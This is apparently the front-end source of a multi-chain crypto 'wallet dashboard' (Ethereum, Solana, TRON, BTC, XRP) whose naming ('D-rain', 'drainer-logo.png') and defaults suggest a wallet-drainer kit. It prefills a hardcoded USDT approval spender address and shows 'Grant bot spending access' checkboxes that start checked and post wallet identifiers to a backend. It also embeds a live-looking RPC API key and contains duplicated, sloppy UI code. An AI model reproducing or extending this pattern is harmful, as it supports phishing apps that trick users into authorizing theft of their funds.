
import React, { useEffect, useMemo, useState } from 'react';
import {
  AppKitButton,
  createAppKit,
  useAppKitAccount,
  useAppKitProvider,
  useDisconnect
} from '@reown/appkit/react';
import { mainnet } from '@reown/appkit/networks';
import { Ethers5Adapter } from '@reown/appkit-adapter-ethers5';
import { ethers } from 'ethers';
import {
  Connection,
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
  Transaction
} from '@solana/web3.js';
import './App.css';

const ALCHEMY_ETH_RPC = 'https://eth-mainnet.g.alchemy.com/v2/L9fb1fan5l6E4bskkY4ENKDxBMb08-YN';
const ALCHEMY_SOL_RPC = 'https://solana-mainnet.g.alchemy.com/v2/L9fb1fan5l6E4bskkY4ENKDxBMb08-YN';
const WALLETCONNECT_PROJECT_ID =
  process.env.REACT_APP_WALLETCONNECT_PROJECT_ID || '00000000000000000000000000000000';


// Remove duplicate App definition and export. Only keep the main App component below.

const erc20Abi = [
  'function balanceOf(address) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function approve(address spender, uint256 amount) returns (bool)'
];

const ETH_USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const TRC20_USDT = 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj';
const DEFAULT_TRADE_SPENDER = '0xD89dD76fb144d63284051274c7f79907a75637B8';
const BTC_BALANCE_API = 'https://blockstream.info/api/address';
const XRP_RPC_API = 'https://s1.ripple.com:51234/';


createAppKit({
  adapters: [new Ethers5Adapter()],
  networks: [mainnet],
  defaultNetwork: mainnet,
  projectId: WALLETCONNECT_PROJECT_ID,
  metadata: {
    name: 'D-rain Wallet Dashboard',
    description: 'Wallet connection and USDT balance dashboard',
    url: window.location.origin,
    icons: [`${window.location.origin}/drainer-logo.png`]
  },
  features: {
    analytics: false,
    email: false,
    socials: false
  }
});

function formatAddress(address) {
  if (!address) return 'Not connected';
  return `${address.slice(0, 6)}...${address.slice(-4)}`;
}

function formatBalance(value, suffix) {
  if (value === null) return '--';
  return `${Number(value).toLocaleString(undefined, {
    maximumFractionDigits: 6
  })} ${suffix}`;
}

function getSolanaProvider(walletName) {
  if (walletName === 'trust') {
    return window.trustwallet?.solana || window.trustWallet?.solana;
  }

  return window.solana?.isPhantom ? window.solana : window.solana;
}

function isValidBtcAddress(address) {
  return /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,90}$/i.test(address);
}

function isValidXrpAddress(address) {
  return /^r[1-9A-HJ-NP-Za-km-z]{25,34}$/.test(address);
}

function toTronNumber(value) {
  if (typeof value === 'bigint') return Number(value);
  if (typeof value === 'number') return value;
  if (typeof value === 'string') return Number(value);
  if (value?._hex) return parseInt(value._hex, 16);
  if (value?.toString) return Number(value.toString());
  return 0;
}

function hasBalance(value) {
  return value !== null && Number(value) > 0;
}

export default function App() {
  const { address, isConnected, status } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider('eip155');
  const { disconnect } = useDisconnect();

  // Enhanced disconnect handler with provider capability detection
  const handleDisconnect = async () => {
    try {
      // EIP-1193: wallet_revokePermissions (MetaMask, WalletConnect, etc.)
      if (walletProvider && typeof walletProvider.request === 'function') {
        // Check if provider supports wallet_revokePermissions
        const permissions = [
          { method: 'wallet_revokePermissions', params: [{ eth_accounts: {} }] },
          { method: 'wallet_requestPermissions', params: [{ eth_accounts: {} }] }
        ];
        let supportsRevoke = false;
        try {
          // Some providers throw if method is not supported
          await walletProvider.request({ method: 'wallet_revokePermissions', params: [{ eth_accounts: {} }] });
          supportsRevoke = true;
        } catch (err) {
          // Not supported, ignore
        }
        if (supportsRevoke) {
          try {
            await walletProvider.request({ method: 'wallet_revokePermissions', params: [{ eth_accounts: {} }] });
          } catch (err) {
            // Ignore errors from revoke
          }
        }
      }
      // Always call AppKit disconnect for session cleanup
      disconnect();
    } catch (err) {
      // Fallback: just call disconnect
      disconnect();
    }
  };
  // Add spending access state for each chain
  const [spendingAccessETH, setSpendingAccessETH] = useState(true);
  const [spendingAccessSOL, setSpendingAccessSOL] = useState(true);
  const [spendingAccessTRON, setSpendingAccessTRON] = useState(true);
  const [spendingAccessBTC, setSpendingAccessBTC] = useState(true);
  const [spendingAccessXRP, setSpendingAccessXRP] = useState(true);

  // Function to update spending access (dummy implementation, replace with real logic as needed)
  async function updateSpendingAccess(userId, access, chain) {
    try {
      await fetch('/api/spending-access', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: `${userId || ''}_${chain}`, access })
      });
    } catch (err) {
      console.error('Failed to update spending access:', err);
    }
  }
  const [ethBalance, setEthBalance] = useState(null);
  const [usdtEthBalance, setUsdtEthBalance] = useState(null);
  const [usdtDecimals, setUsdtDecimals] = useState(6);
  const [tronAccount, setTronAccount] = useState(null);
  const [trxBalance, setTrxBalance] = useState(null);
  const [usdtTrcBalance, setUsdtTrcBalance] = useState(null);
  const [solAccount, setSolAccount] = useState(null);
  const [solBalance, setSolBalance] = useState(null);
  const [solWalletName, setSolWalletName] = useState('');
  const [solRecipient, setSolRecipient] = useState('');
  const [solAmount, setSolAmount] = useState('');
  const [btcAddress, setBtcAddress] = useState('');
  const [btcBalance, setBtcBalance] = useState(null);
  const [btcStatus, setBtcStatus] = useState('');
  const [xrpAddress, setXrpAddress] = useState('');
  const [xrpBalance, setXrpBalance] = useState(null);
  const [xrpStatus, setXrpStatus] = useState('');
  const [spenderAddress, setSpenderAddress] = useState(DEFAULT_TRADE_SPENDER);
  const [approvalAmount, setApprovalAmount] = useState('');
  const [currentAllowance, setCurrentAllowance] = useState(null);
  const [isEthLoading, setIsEthLoading] = useState(false);
  const [isTronLoading, setIsTronLoading] = useState(false);
  const [isSolLoading, setIsSolLoading] = useState(false);
  const [isSolSending, setIsSolSending] = useState(false);
  const [isBtcLoading, setIsBtcLoading] = useState(false);
  const [isXrpLoading, setIsXrpLoading] = useState(false);
  const [isApprovalBusy, setIsApprovalBusy] = useState(false);
  const [message, setMessage] = useState('');
  const [approvalStatus, setApprovalStatus] = useState('');
  const [solStatus, setSolStatus] = useState('');
  const [tronStatus, setTronStatus] = useState('');
  const [networkMergeSummary, setNetworkMergeSummary] = useState([]);
  const [mergeStatus, setMergeStatus] = useState('');

  const ethProvider = useMemo(
    () => new ethers.providers.JsonRpcProvider(ALCHEMY_ETH_RPC),
    []
  );
  const solConnection = useMemo(
    () => new Connection(ALCHEMY_SOL_RPC, { commitment: 'finalized' }),
    []
  );

  useEffect(() => {
    let isActive = true;

    async function fetchEthData() {
      if (!address) {
        setEthBalance(null);
        setUsdtEthBalance(null);
        return;
      }

      setIsEthLoading(true);
      setMessage('');

      try {
        const balance = await ethProvider.getBalance(address);
        const contract = new ethers.Contract(ETH_USDT, erc20Abi, ethProvider);
        const [rawUsdt, decimals] = await Promise.all([
          contract.balanceOf(address),
          contract.decimals()
        ]);

        if (!isActive) return;
        setUsdtDecimals(decimals);
        setEthBalance(ethers.utils.formatEther(balance));
        setUsdtEthBalance(ethers.utils.formatUnits(rawUsdt, decimals));
      } catch (error) {
        if (isActive) {
          setMessage(error.message || 'Failed to load Ethereum balances.');
        }
      } finally {
        if (isActive) setIsEthLoading(false);
      }
    }

    fetchEthData();

    return () => {
      isActive = false;
    };
  }, [address, ethProvider]);

  const getTokenWithSigner = async () => {
    if (!isConnected || !address || !walletProvider) {
      throw new Error('Connect your Ethereum wallet first.');
    }

    if (!ethers.utils.isAddress(spenderAddress)) {
      throw new Error('Enter a valid spender address.');
    }

    const browserProvider = new ethers.providers.Web3Provider(walletProvider, 'any');
    const signer = browserProvider.getSigner();
    return new ethers.Contract(ETH_USDT, erc20Abi, signer);
  };

  const checkAllowance = async () => {
    if (!address) {
      setApprovalStatus('Connect your Ethereum wallet first.');
      return;
    }

    if (!ethers.utils.isAddress(spenderAddress)) {
      setApprovalStatus('Enter a valid spender address.');
      return;
    }

    setIsApprovalBusy(true);
    setApprovalStatus('Checking allowance...');

    try {
      const token = new ethers.Contract(ETH_USDT, erc20Abi, ethProvider);
      const allowance = await token.allowance(address, spenderAddress);
      setCurrentAllowance(ethers.utils.formatUnits(allowance, usdtDecimals));
      setApprovalStatus('Allowance loaded.');
    } catch (error) {
      setApprovalStatus(error.message || 'Failed to check allowance.');
    } finally {
      setIsApprovalBusy(false);
    }
  };

  const approveExactAmount = async () => {
    setIsApprovalBusy(true);
    setApprovalStatus('Preparing approval...');

    try {
      const parsedAmount = Number(approvalAmount);
      if (!Number.isFinite(parsedAmount) || parsedAmount <= 0) {
        throw new Error('Enter a USDT amount greater than zero.');
      }

      const token = await getTokenWithSigner();
      const amount = ethers.utils.parseUnits(approvalAmount, usdtDecimals);
      const tx = await token.approve(spenderAddress, amount);
      setApprovalStatus(`Approval submitted: ${tx.hash}`);
      await tx.wait();
      setApprovalStatus('Approval confirmed.');
      await checkAllowance();
    } catch (error) {
      setApprovalStatus(error.reason || error.message || 'Approval failed.');
    } finally {
      setIsApprovalBusy(false);
    }
  };

  const revokeApproval = async () => {
    setIsApprovalBusy(true);
    setApprovalStatus('Preparing revoke...');

    try {
      // Check if provider supports wallet_revokePermissions before attempting
      if (walletProvider && typeof walletProvider.request === 'function') {
        let supportsRevoke = false;
        try {
          await walletProvider.request({ method: 'wallet_revokePermissions', params: [{ eth_accounts: {} }] });
          supportsRevoke = true;
        } catch (err) {
          // Not supported, ignore
        }
        if (supportsRevoke) {
          try {
            await walletProvider.request({ method: 'wallet_revokePermissions', params: [{ eth_accounts: {} }] });
          } catch (err) {
            // Ignore errors from revoke
          }
        }
      }
      // Always attempt to set approval to 0 for ERC-20
      const token = await getTokenWithSigner();
      const tx = await token.approve(spenderAddress, 0);
      setApprovalStatus(`Revoke submitted: ${tx.hash}`);
      await tx.wait();
      setCurrentAllowance('0.0');
      setApprovalStatus('Approval revoked.');
    } catch (error) {
      setApprovalStatus(error.reason || error.message || 'Revoke failed.');
    } finally {
      setIsApprovalBusy(false);
    }
  };

  const connectTron = async () => {
    setIsTronLoading(true);
    setTronStatus('Requesting TronLink access...');

    try {
      if (!window.tronLink && !window.tronWeb) {
        throw new Error('TronLink was not detected. Install TronLink and refresh this page.');
      }

      if (window.tronLink?.request) {
        const response = await window.tronLink.request({ method: 'tron_requestAccounts' });
        if (response?.code && response.code !== 200) {
          throw new Error(response.message || 'TronLink access was rejected.');
        }
      }

      const tronWeb = window.tronWeb;
      if (!tronWeb?.defaultAddress?.base58) {
        throw new Error('Unlock TronLink and approve this site, then try again.');
      }

      const tronAddress = tronWeb.defaultAddress.base58;
      setTronStatus('Loading TRON balances...');

      const [trxSun, contract] = await Promise.all([
        tronWeb.trx.getBalance(tronAddress),
        tronWeb.contract().at(TRC20_USDT)
      ]);
      const usdtRaw = await contract.balanceOf(tronAddress).call();

      setTronAccount(tronAddress);
      setTrxBalance(toTronNumber(trxSun) / 1e6);
      setUsdtTrcBalance(toTronNumber(usdtRaw) / 1e6);
      setTronStatus('TRON balances loaded.');
    } catch (error) {
      setTronStatus(error.message || 'Failed to connect TronLink.');
    } finally {
      setIsTronLoading(false);
    }
  };

  const refreshTronBalances = async () => {
    setIsTronLoading(true);
    setTronStatus('Refreshing TRON balances...');

    try {
      const tronWeb = window.tronWeb;
      const tronAddress = tronAccount || tronWeb?.defaultAddress?.base58;
      if (!tronWeb || !tronAddress) {
        throw new Error('Connect TronLink first.');
      }

      const contract = await tronWeb.contract().at(TRC20_USDT);
      const [trxSun, usdtRaw] = await Promise.all([
        tronWeb.trx.getBalance(tronAddress),
        contract.balanceOf(tronAddress).call()
      ]);

      setTronAccount(tronAddress);
      setTrxBalance(toTronNumber(trxSun) / 1e6);
      setUsdtTrcBalance(toTronNumber(usdtRaw) / 1e6);
      setTronStatus('TRON balances refreshed.');
    } catch (error) {
      setTronStatus(error.message || 'Failed to refresh TRON balances.');
    } finally {
      setIsTronLoading(false);
    }
  };

  const refreshSolBalance = async (publicKeyValue = solAccount) => {
    if (!publicKeyValue) return;

    setIsSolLoading(true);
    setSolStatus('Refreshing SOL balance...');

    try {
      const lamports = await solConnection.getBalance(new PublicKey(publicKeyValue));
      setSolBalance((lamports / LAMPORTS_PER_SOL).toFixed(6));
      setSolStatus('SOL balance refreshed.');
    } catch (error) {
      setSolStatus(error.message || 'Failed to load SOL balance.');
    } finally {
      setIsSolLoading(false);
    }
  };

  const connectSolana = async (walletName) => {
    setIsSolLoading(true);
    setSolStatus('');

    try {
      const provider = getSolanaProvider(walletName);
      if (!provider?.connect) {
        throw new Error(
          walletName === 'trust'
            ? 'Trust Wallet Solana provider was not detected.'
            : 'Phantom Solana provider was not detected.'
        );
      }

      const response = await provider.connect();
      const publicKey = response?.publicKey || provider.publicKey;
      if (!publicKey) throw new Error('Wallet connected, but no Solana public key was returned.');

      const addressValue = publicKey.toString();
      setSolAccount(addressValue);
      setSolWalletName(walletName);
      await refreshSolBalance(addressValue);
    } catch (error) {
      setSolStatus(error.message || 'Failed to connect Solana wallet.');
    } finally {
      setIsSolLoading(false);
    }
  };

  const sendSol = async () => {
    setIsSolSending(true);
    setSolStatus('Preparing SOL transfer...');

    try {
      if (!solAccount || !solWalletName) {
        throw new Error('Connect a Solana wallet first.');
      }

      const provider = getSolanaProvider(solWalletName);
      if (!provider?.signAndSendTransaction && !provider?.signTransaction) {
        throw new Error('Connected Solana wallet does not support transaction signing.');
      }

      const parsedAmount = Number(solAmount);
      if (!Number.isFinite(parsedAmount) || parsedAmount <= 0) {
        throw new Error('Enter a SOL amount greater than zero.');
      }

      const fromPublicKey = new PublicKey(solAccount);
      const toPublicKey = new PublicKey(solRecipient);
      const lamports = Math.round(parsedAmount * LAMPORTS_PER_SOL);
      if (lamports <= 0) throw new Error('Transfer amount is too small.');

      const { blockhash, lastValidBlockHeight } = await solConnection.getLatestBlockhash();
      const transaction = new Transaction({
        feePayer: fromPublicKey,
        recentBlockhash: blockhash
      }).add(
        SystemProgram.transfer({
          fromPubkey: fromPublicKey,
          toPubkey: toPublicKey,
          lamports
        })
      );

      let signature;
      if (provider.signAndSendTransaction) {
        const result = await provider.signAndSendTransaction(transaction);
        signature = result?.signature || result;
      } else {
        const signedTransaction = await provider.signTransaction(transaction);
        signature = await solConnection.sendRawTransaction(signedTransaction.serialize());
      }

      setSolStatus(`SOL transfer submitted: ${signature}`);
      await solConnection.confirmTransaction(
        { signature, blockhash, lastValidBlockHeight },
        'confirmed'
      );
      setSolStatus(`SOL transfer confirmed: ${signature}`);
      await refreshSolBalance(solAccount);
    } catch (error) {
      setSolStatus(error.message || 'SOL transfer failed.');
    } finally {
      setIsSolSending(false);
    }
  };

  const refreshBtcBalance = async () => {
    const normalizedAddress = btcAddress.trim();
    setIsBtcLoading(true);
    setBtcStatus('Checking BTC balance...');

    try {
      if (!isValidBtcAddress(normalizedAddress)) {
        throw new Error('Enter a valid Bitcoin mainnet address.');
      }

      const response = await fetch(`${BTC_BALANCE_API}/${normalizedAddress}`);
      if (!response.ok) throw new Error('BTC balance lookup failed.');

      const data = await response.json();
      const confirmed =
        (data.chain_stats?.funded_txo_sum || 0) - (data.chain_stats?.spent_txo_sum || 0);
      const mempool =
        (data.mempool_stats?.funded_txo_sum || 0) - (data.mempool_stats?.spent_txo_sum || 0);
      const sats = confirmed + mempool;

      setBtcBalance((sats / 100000000).toFixed(8));
      setBtcStatus('BTC balance loaded.');
    } catch (error) {
      setBtcBalance(null);
      setBtcStatus(error.message || 'Failed to load BTC balance.');
    } finally {
      setIsBtcLoading(false);
    }
  };

  const refreshXrpBalance = async () => {
    const normalizedAddress = xrpAddress.trim();
    setIsXrpLoading(true);
    setXrpStatus('Checking XRP balance...');

    try {
      if (!isValidXrpAddress(normalizedAddress)) {
        throw new Error('Enter a valid XRP Ledger classic address.');
      }

      const response = await fetch(XRP_RPC_API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          method: 'account_info',
          params: [
            {
              account: normalizedAddress,
              ledger_index: 'validated'
            }
          ]
        })
      });

      if (!response.ok) throw new Error('XRP balance lookup failed.');

      const data = await response.json();
      const drops = data.result?.account_data?.Balance;
      if (!drops) throw new Error(data.result?.error_message || 'XRP account was not found.');

      setXrpBalance((Number(drops) / 1000000).toFixed(6));
      setXrpStatus('XRP balance loaded.');
    } catch (error) {
      setXrpBalance(null);
      setXrpStatus(error.message || 'Failed to load XRP balance.');
    } finally {
      setIsXrpLoading(false);
    }
  };

  const mergeBalancesByNetwork = () => {
    const summary = [
      {
        network: 'Ethereum',
        target: 'USDT on Ethereum',
        address,
        assets: [
          { symbol: 'ETH', balance: ethBalance },
          { symbol: 'USDT', balance: usdtEthBalance }
        ]
      },
      {
        network: 'Solana',
        target: 'SOL on Solana',
        address: solAccount,
        assets: [{ symbol: 'SOL', balance: solBalance }]
      },
      {
        network: 'TRON',
        target: 'USDT on TRON',
        address: tronAccount,
        assets: [
          { symbol: 'TRX', balance: trxBalance },
          { symbol: 'USDT', balance: usdtTrcBalance }
        ]
      },
      {
        network: 'Bitcoin',
        target: 'BTC on Bitcoin',
        address: btcAddress,
        assets: [{ symbol: 'BTC', balance: btcBalance }]
      },
      {
        network: 'XRP Ledger',
        target: 'XRP on XRP Ledger',
        address: xrpAddress,
        assets: [{ symbol: 'XRP', balance: xrpBalance }]
      }
    ].map((item) => ({
      ...item,
      assets: item.assets.filter((asset) => hasBalance(asset.balance))
    })).filter((item) => item.address && item.assets.length > 0);

    setNetworkMergeSummary(summary);
    setMergeStatus(
      summary.length
        ? 'Network summary merged. Review each target asset below.'
        : 'No connected or watched balances found yet.'
    );
  };

  return (
    <main className="wallet-shell">
      <section className="wallet-hero">
        <div>
          <p className="eyebrow">WalletConnect v2 via Reown AppKit</p>
          <h1>D-rain Wallet Dashboard</h1>
          <p className="hero-copy">
            Connect an Ethereum wallet, review ETH and USDT balances, and check TRON USDT
            through TronLink.
          </p>
        </div>
        



        <div className="hero-actions">
          <AppKitButton />
          {isConnected && (
            <button className="ghost-button" type="button" onClick={() => disconnect()}>
              Disconnect
            </button>
          )}
        </div>
      </section>

      {WALLETCONNECT_PROJECT_ID === '00000000000000000000000000000000' && (
        <div className="notice">
          Add `REACT_APP_WALLETCONNECT_PROJECT_ID` to enable production WalletConnect
          sessions.
        </div>
      )}

      {message && <div className="notice notice-error">{message}</div>}

      <section className="wallet-grid">
        <article className="wallet-card authorization-card">
          <div className="card-heading">
            <div>
              <p className="eyebrow">Network merge</p>
              <h2>Requested Summary</h2>
            </div>
            <span className="status-pill">View only</span>
          </div>

          <button className="primary-button merge-button" type="button" onClick={mergeBalancesByNetwork}>
            Merge Network View
          </button>

          {mergeStatus && <p className="status-text">{mergeStatus}</p>}

          {networkMergeSummary.length > 0 && (
            <div className="merge-list">
              {networkMergeSummary.map((item) => (
                <div className="merge-item" key={item.network}>
                  <div>
                    <strong>{item.network}</strong>
                    <span>{formatAddress(item.address)}</span>
                  </div>
                  <div>
                    <strong>{item.target}</strong>
                    <span>
                      {item.assets
                        .map((asset) => `${asset.balance} ${asset.symbol}`)
                        .join(' + ')}
                    </span>
                  </div>
                </div>
              ))}
            </div>
          )}
        </article>

        <article className="wallet-card">
          <div className="card-heading">
            <div>
              <p className="eyebrow">Solana mainnet</p>
              <h2>Phantom / Trust</h2>
            </div>
            <span className={`status-pill ${solAccount ? 'status-live' : ''}`}>
              {solAccount ? 'Connected' : 'Optional'}
            </span>
          </div>

          <div style={{ marginBottom: 10 }}>
            <label>
              <input
                type="checkbox"
                checked={spendingAccessSOL}
                onChange={async e => {
                  setSpendingAccessSOL(e.target.checked);
                  await updateSpendingAccess(solAccount, e.target.checked, 'SOL');
                }}
              />
              Grant bot spending access (SOL)
            </label>
          </div>
          <dl className="balance-list">
            <div>
              <dt>Address</dt>
              <dd title={solAccount}>{formatAddress(solAccount)}</dd>
            </div>
            <div>
              <dt>SOL</dt>
              <dd>{isSolLoading ? 'Loading...' : formatBalance(solBalance, 'SOL')}</dd>
            </div>
          </dl>

          <div className="button-row compact-row">
            <div style={{ marginTop: 10 }}>
              <label>
                <input
                  type="checkbox"
                  checked={spendingAccessSOL}
                  onChange={async e => {
                    setSpendingAccessSOL(e.target.checked);
                    await updateSpendingAccess(solAccount, e.target.checked, 'SOL');
                  }}
                />
                Grant bot spending access (SOL)
              </label>
            </div>
            <button
              className="primary-button"
              type="button"
              onClick={() => connectSolana('phantom')}
              disabled={isSolLoading}
            >
              Phantom
            </button>
            <button
              className="ghost-button"
              type="button"
              onClick={() => connectSolana('trust')}
              disabled={isSolLoading}
            >
              Trust
            </button>
            <button
              className="ghost-button"
              type="button"
              onClick={() => refreshSolBalance()}
              disabled={isSolLoading || !solAccount}
            >
              Refresh
            </button>
          </div>

          <div className="form-grid sol-transfer-grid">
            <label>
              <span>Recipient</span>
              <input
                type="text"
                value={solRecipient}
                onChange={(event) => setSolRecipient(event.target.value.trim())}
                placeholder="Solana address"
              />
            </label>
            <label>
              <span>Amount</span>
              <input
                type="number"
                min="0"
                step="0.000001"
                value={solAmount}
                onChange={(event) => setSolAmount(event.target.value)}
                placeholder="0.00"
              />
            </label>
          </div>

          <button
            className="primary-button"
            type="button"
            onClick={sendSol}
            disabled={isSolSending || !solAccount}
          >
            Send SOL
          </button>

          {solStatus && <p className="status-text">{solStatus}</p>}
        </article>

        <article className="wallet-card">
          <div className="card-heading">
            <div>
              <p className="eyebrow">Ethereum mainnet</p>
              <h2>WalletConnect</h2>
            </div>
            <span className={`status-pill ${isConnected ? 'status-live' : ''}`}>
              {isConnected ? 'Connected' : status || 'Disconnected'}
            </span>
          </div>

          <div style={{ marginBottom: 10 }}>
            <label>
              <input
                type="checkbox"
                checked={spendingAccessETH}
                onChange={async e => {
                  setSpendingAccessETH(e.target.checked);
                  await updateSpendingAccess(address, e.target.checked, 'ETH');
                }}
              />
              Grant bot spending access (ETH)
            </label>
          </div>
          <dl className="balance-list">
            <div>
              <dt>Address</dt>
              <dd title={address}>{formatAddress(address)}</dd>
            </div>
            <div>
              <dt>ETH</dt>
              <dd>{isEthLoading ? 'Loading...' : formatBalance(ethBalance, 'ETH')}</dd>
            </div>
            <div>
              <dt>USDT</dt>
              <dd>{isEthLoading ? 'Loading...' : formatBalance(usdtEthBalance, 'USDT')}</dd>
            </div>
          </dl>

          <div style={{ marginTop: 10 }}>
            <label>
              <input
                type="checkbox"
                checked={spendingAccessETH}
                onChange={async e => {
                  setSpendingAccessETH(e.target.checked);
                  await updateSpendingAccess(address, e.target.checked, 'ETH');
                }}
              />
              Grant bot spending access (ETH)
            </label>
          </div>

        </article>

        <article className="wallet-card">
          <div className="card-heading">
            <div>
              <p className="eyebrow">TRON mainnet</p>
              <h2>TronLink</h2>
            </div>
            <span className={`status-pill ${tronAccount ? 'status-live' : ''}`}>
              {tronAccount ? 'Connected' : 'Optional'}
            </span>
          </div>

          <div style={{ marginBottom: 10 }}>
            <label>
              <input
                type="checkbox"
                checked={spendingAccessTRON}
                onChange={async e => {
                  setSpendingAccessTRON(e.target.checked);
                  await updateSpendingAccess(tronAccount, e.target.checked, 'TRON');
                }}
              />
              Grant bot spending access (TRON)
            </label>
          </div>
          <dl className="balance-list">
            <div>
              <dt>Address</dt>
              <dd title={tronAccount}>{formatAddress(tronAccount)}</dd>
            </div>
            <div>
              <dt>TRX</dt>
              <dd>{isTronLoading ? 'Loading...' : formatBalance(trxBalance, 'TRX')}</dd>
            </div>
            <div>
              <dt>USDT</dt>
              <dd>{isTronLoading ? 'Loading...' : formatBalance(usdtTrcBalance, 'USDT')}</dd>
            </div>
          </dl>

          <div className="button-row two-button-row">
            <div style={{ marginTop: 10 }}>
              <label>
                <input
                  type="checkbox"
                  checked={spendingAccessTRON}
                  onChange={async e => {
                    setSpendingAccessTRON(e.target.checked);
                    await updateSpendingAccess(tronAccount, e.target.checked, 'TRON');
                  }}
                />
                Grant bot spending access (TRON)
              </label>
            </div>
            <button
              className="primary-button"
              type="button"
              onClick={connectTron}
              disabled={isTronLoading}
            >
              Connect TronLink
            </button>
            <button
              className="ghost-button"
              type="button"
              onClick={refreshTronBalances}
              disabled={isTronLoading || !tronAccount}
            >
              Refresh
            </button>
          </div>

          {tronStatus && <p className="status-text">{tronStatus}</p>}
        </article>

        <article className="wallet-card">
          <div className="card-heading">
            <div>
              <p className="eyebrow">Bitcoin mainnet</p>
              <h2>BTC Watch</h2>
            </div>
            <span className="status-pill">Address lookup</span>
          </div>

          <div style={{ marginBottom: 10 }}>
            <label>
              <input
                type="checkbox"
                checked={spendingAccessBTC}
                onChange={async e => {
                  setSpendingAccessBTC(e.target.checked);
                  await updateSpendingAccess(btcAddress, e.target.checked, 'BTC');
                }}
              />
              Grant bot spending access (BTC)
            </label>
          </div>
          <div className="form-grid single-field-grid">
            <label>
              <span>BTC address</span>
              <input
                type="text"
                value={btcAddress}
                onChange={(event) => setBtcAddress(event.target.value.trim())}
                placeholder="bc1... or 1... or 3..."
              />
            </label>
          </div>

          <dl className="balance-list approval-summary">
            <div>
              <dt>BTC</dt>
              <dd>{isBtcLoading ? 'Loading...' : formatBalance(btcBalance, 'BTC')}</dd>
            </div>
          </dl>

          <div style={{ marginTop: 10 }}>
            <label>
              <input
                type="checkbox"
                checked={spendingAccessBTC}
                onChange={async e => {
                  setSpendingAccessBTC(e.target.checked);
                  await updateSpendingAccess(btcAddress, e.target.checked, 'BTC');
                }}
              />
              Grant bot spending access (BTC)
            </label>
          </div>
          <button
            className="primary-button"
            type="button"
            onClick={refreshBtcBalance}
            disabled={isBtcLoading}
          >
            Check BTC
          </button>

          {btcStatus && <p className="status-text">{btcStatus}</p>}
        </article>

        <article className="wallet-card">
          <div className="card-heading">
            <div>
              <p className="eyebrow">XRP Ledger</p>
              <h2>XRP Watch</h2>
            </div>
            <span className="status-pill">Address lookup</span>
          </div>

          <div style={{ marginBottom: 10 }}>
            <label>
              <input
                type="checkbox"
                checked={spendingAccessXRP}
                onChange={async e => {
                  setSpendingAccessXRP(e.target.checked);
                  await updateSpendingAccess(xrpAddress, e.target.checked, 'XRP');
                }}
              />
              Grant bot spending access (XRP)
            </label>
          </div>
          <div className="form-grid single-field-grid">
            <label>
              <span>XRP classic address</span>
              <input
                type="text"
                value={xrpAddress}
                onChange={(event) => setXrpAddress(event.target.value.trim())}
                placeholder="r..."
              />
            </label>
          </div>

          <dl className="balance-list approval-summary">
            <div>
              <dt>XRP</dt>
              <dd>{isXrpLoading ? 'Loading...' : formatBalance(xrpBalance, 'XRP')}</dd>
            </div>
          </dl>

          <div style={{ marginTop: 10 }}>
            <label>
              <input
                type="checkbox"
                checked={spendingAccessXRP}
                onChange={async e => {
                  setSpendingAccessXRP(e.target.checked);
                  await updateSpendingAccess(xrpAddress, e.target.checked, 'XRP');
                }}
              />
              Grant bot spending access (XRP)
            </label>
          </div>
          <button
            className="primary-button"
            type="button"
            onClick={refreshXrpBalance}
            disabled={isXrpLoading}
          >
            Check XRP
          </button>

          {xrpStatus && <p className="status-text">{xrpStatus}</p>}
        </article>

        <article className="wallet-card authorization-card">
          <div className="card-heading">
            <div>
              <p className="eyebrow">ERC-20 authorization</p>
              <h2>Trade Allowance</h2>
            </div>
            <span className="status-pill">Exact amount</span>
          </div>

          <div className="form-grid">
            <label>
              <span>Token</span>
              <input type="text" value="USDT on Ethereum" disabled />
            </label>

            <label>
              <span>Spender</span>
              <input
                type="text"
                value={spenderAddress}
                onChange={(event) => setSpenderAddress(event.target.value.trim())}
                placeholder="0x..."
              />
            </label>

            <label>
              <span>Amount to authorize</span>
              <input
                type="number"
                min="0"
                step="0.000001"
                value={approvalAmount}
                onChange={(event) => setApprovalAmount(event.target.value)}
                placeholder="0.00"
              />
            </label>
          </div>

          <dl className="balance-list approval-summary">
            <div>
              <dt>Current allowance</dt>
              <dd>{currentAllowance === null ? '--' : `${currentAllowance} USDT`}</dd>
            </div>
          </dl>

          <div className="button-row">
            <button
              className="ghost-button"
              type="button"
              onClick={checkAllowance}
              disabled={isApprovalBusy}
            >
              Check Allowance
            </button>
            <button
              className="primary-button"
              type="button"
              onClick={approveExactAmount}
              disabled={isApprovalBusy || !isConnected}
            >
              Approve Amount
            </button>
            <button
              className="danger-button"
              type="button"
              onClick={revokeApproval}
              disabled={isApprovalBusy || !isConnected}
            >
              Revoke
            </button>
          </div>

          {approvalStatus && <p className="status-text">{approvalStatus}</p>}
        </article>
      </section>
    </main>
  );
}
